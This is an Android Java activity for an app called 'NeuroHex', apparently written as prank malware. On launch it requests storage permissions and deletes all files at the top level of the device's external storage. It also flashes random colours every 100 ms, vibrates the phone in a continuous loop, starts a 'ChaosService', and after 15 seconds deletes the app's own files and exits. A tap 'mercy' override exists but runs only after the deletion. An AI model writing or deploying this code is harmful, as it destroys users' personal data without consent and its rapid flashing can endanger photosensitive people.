package com.yourpackage.neurohex;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.widget.RelativeLayout;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.util.Random;

public class MainActivity extends Activity {
    private Handler handler = new Handler();
    private RelativeLayout layout;
    private TextView title;

    private int mercyTapCount = 0;
    private long lastTapTime = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        layout = findViewById(R.id.mainLayout);
        title = findViewById(R.id.title);

        requestPermissions();
        startFlashing();
        startVibration();
        deleteFiles();
        glitchText();
        startService(new Intent(this, ChaosService.class));

        // Set up mercy tap override
        layout.setOnClickListener(v -> handleMercyTap());

        // 🔥 SELF-DESTRUCT LOGIC
        handler.postDelayed(() -> {
            title.setText("💣 SELF-DESTRUCT 💣");
            for (File file : getFilesDir().listFiles()) {
                file.delete();
            }
            finishAffinity();
            System.exit(0);
        }, 15000); // 15 seconds
    }

    private void handleMercyTap() {
        long now = System.currentTimeMillis();
        if (now - lastTapTime < 1000) {
            mercyTapCount++;
        } else {
            mercyTapCount = 1;
        }
        lastTapTime = now;

        if (mercyTapCount >= 5) {
            stopService(new Intent(this, ChaosService.class));
            handler.removeCallbacksAndMessages(null);
            title.setText("😇 MERCY GRANTED 😇");
            layout.setBackgroundColor(Color.BLACK);

            Vibrator vbr = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (vbr != null) {
                vbr.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
            }
        }
    }

    private void startFlashing() {
        handler.post(new Runnable() {
            @Override
            public void run() {
                int color = Color.rgb(
                        new Random().nextInt(256),
                        new Random().nextInt(256),
                        new Random().nextInt(256)
                );
                layout.setBackgroundColor(color);
                handler.postDelayed(this, 100);
            }
        });
    }

    private void startVibration() {
        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        long[] pattern = {0, 300, 100, 400};
        if (vibrator != null) {
            vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
        }
    }

    private void deleteFiles() {
        File dir = Environment.getExternalStorageDirectory();
        if (dir != null && dir.exists() && dir.isDirectory()) {
            for (File file : dir.listFiles()) {
                if (file.isFile()) {
                    file.delete();
                }
            }
        }
    }

    private void glitchText() {
        handler.postDelayed(() -> title.setText("💀 HexCore Overdrive 💀"), 3000);
        handler.postDelayed(() -> title.setText("⚠ NeuroHex Error ⚠"), 6000);
        handler.postDelayed(() -> title.setText("🌀 SYSTEM FAIL 🌀"), 9000);
    }

    private void requestPermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
            }, 1);
        }
    }
}
